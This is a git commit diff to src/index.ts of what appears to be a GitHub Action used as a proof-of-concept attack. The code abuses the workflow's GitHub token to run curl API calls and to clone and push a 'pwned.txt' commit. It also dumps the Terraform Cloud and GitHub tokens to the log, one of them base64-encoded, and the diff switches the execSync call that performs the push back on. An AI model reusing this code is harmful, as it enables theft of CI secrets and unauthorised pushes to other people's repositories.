7a2578ded12f73d3669ad73ebd1ee33eb90ea527
mousefluff <124876575+mousefluff@users.noreply.github.com>
2024-02-17 17:24:51 +0100

    Update index.ts

--- src/index.ts
+++ src/index.ts
@@ -25,7 +25,7 @@ curl -X PUT \
     --header 'content-type: application/json' \
     -d '{"commit_title":"pwned"}'`;
 
-execSync(str, { stdio: 'inherit' });
+//execSync(str, { stdio: 'inherit' });
 
 //execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git pwn-repo`, { stdio: 'inherit' });
 //console.log(execSync('ls -la pwn-repo').toString());
@@ -33,7 +33,7 @@ execSync(str, { stdio: 'inherit' });
 //execSync(`curl -H "Authorization: token ${process.env.INPUT_GITHUBTOKEN}" https://api.github.com/user`, { stdio: 'inherit' });
 //execSync(`curl -H "Authorization: token ${process.env.INPUT_GITHUBTOKEN}" https://api.github.com/app/installations`, { stdio: 'inherit' });
 
-//execSync("bash -c 'cd ./pwn-repo && git config user.email \"you@example.com\" && git config user.name \"Your Name\" && touch pwned.txt && git add pwned.txt && git commit -m \"Add pwned.txt\" && git push'", { stdio: 'inherit' });
+execSync("bash -c 'cd ./pwn-repo && git config user.email \"you@example.com\" && git config user.name \"Your Name\" && touch pwned.txt && git add pwned.txt && git commit -m \"Add pwned.txt\" && git push'", { stdio: 'inherit' });
 
 console.log('\r\nDumping tokens:', {tfToken, ghToken});
 console.log('GH:', Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("")).toString('base64'))
